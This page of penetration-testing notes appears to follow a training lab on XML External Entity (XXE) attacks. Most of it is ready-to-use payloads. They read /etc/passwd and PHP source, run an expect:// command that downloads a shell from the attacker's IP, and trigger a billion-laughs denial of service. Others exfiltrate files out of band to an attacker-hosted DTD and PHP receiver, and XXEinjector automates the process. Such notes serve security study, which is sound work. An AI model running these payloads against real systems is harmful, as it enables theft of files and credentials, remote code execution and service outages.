# 👽 XXE(XML External Entity)

| Key         | Definition                                                                                                    | Example                                  |
| ----------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| Tag         | The keys of an XML document, usually wrapped with (\</>) characters.                                          | `<date>`                                 |
| Entity      | XML variables, usually wrapped with (&/;) characters.                                                         | `&lt;`                                   |
| Element     | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | `<date>01-01-2022</date>`                |
| Attribute   | Optional specifications for any element that are stored in the tags, which may be used by the XML parser.c    | `version="1.0"/encoding="UTF-8"`         |
| Declaration | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.   | `<?xml version="1.0" encoding="UTF-8"?>` |

## Local file disclosure

<figure><img src="../../.gitbook/assets/XXE(XML External Entity).png" alt=""><figcaption></figcaption></figure>

Since data is being sent in XML

And the email gets displayed back. So trying different variables(**&**/**;**) We can display the company variable:&#x20;

<figure><img src="../../.gitbook/assets/XXE(XML External Entity)-1.png" alt=""><figcaption></figcaption></figure>

&#x20;It is displaying the company name instead of **\&company;**

**Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

### Reading Sensitive Files

So defining an external XML entity

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

<figure><img src="../../.gitbook/assets/XXE(XML External Entity)-3.png" alt=""><figcaption></figcaption></figure>

**Tip**: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

### Reading Source Code

<figure><img src="../../.gitbook/assets/XXE(XML External Entity)-4.png" alt=""><figcaption></figcaption></figure>

As we can see, this did not work, as we did not get any content. This happened because the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity.

If a file contains some of XML's special characters (e.g. \</>/&), it would break the external entity reference and not be used for the reference

So we can base64 encode:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

<figure><img src="../../.gitbook/assets/XXE(XML External Entity)-8.png" alt=""><figcaption></figcaption></figure>

### Remote Code Execution

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

**Note:** We replaced all spaces in the above XML code with **$IFS**, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and { may break the code, so we should avoid using them.

### Other XXE Attacks

Another common attack often carried out through XXE vulnerabilities is SSRF exploitation. This causes DOS

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>

```

### CDATA

With php files we can avoid breaking it by using base64 but for other types of files we need to use CDATA like `<![CDATA[ FILE_CONTENT ]]>` For example:

```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

Then we can refer the **\&joined;** entity. However this **will not work** since XML prevents joining of internal and external entity.

**Better Way:**

Utilize **XML Parameter Entities** (special entity starts with % and used only in DTD) If we reference them from an external source then all of them would be considered external and joined like:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Host on attack machine:

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Now we can reference the xxe.dtd and use **\&joined;** Example:

```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

This way no need to base64 encode it.&#x20;

<figure><img src="../../.gitbook/assets/XXE(XML External Entity)-6.png" alt=""><figcaption></figcaption></figure>

**Note**: In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.

### Error Based XXE

#### Errors shown

If application does not write any output we need to do XXE blind. If any runtime errors are show (eg: PHP errors)&#x20;

<figure><img src="../../.gitbook/assets/XXE(XML External Entity)-5.png" alt=""><figcaption></figcaption></figure>

&#x20;To check if errors are present reference a non existing entity. This can reveal directories. We can host a DTD file with:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

The above payload defines the file parameter entity and then joins it with an entity that does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined %file; as part of the error.

```
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Once we host our DTD script and send the above payload as our XML data (no need to include any other XML data), we will get the content of the /etc/hosts file as follows:

### Completely Blind

#### Out-of-band(OOB) Data Exfiltration

Out of band is like last section where we connected to our machine to get the hosted file.

Instead of sending the request only we can make the webapp send the request to our web server with the content of the file we requested. Like so:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

We can automate this process by making a php webserver: Index.php

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Then run the server `php -S 0.0.0.0:8000` The payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

The request would look like this:&#x20;

<figure><img src="../../.gitbook/assets/XXE(XML External Entity)-7.png" alt=""><figcaption></figcaption></figure>

&#x20;The file content will be there in the attack machine terminal

**Tip**: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.

### Automated OOB Exfiltration

Copy the request from burp suite and add XXEINJECT after it and save it in a file

```html
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Then run:

```bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
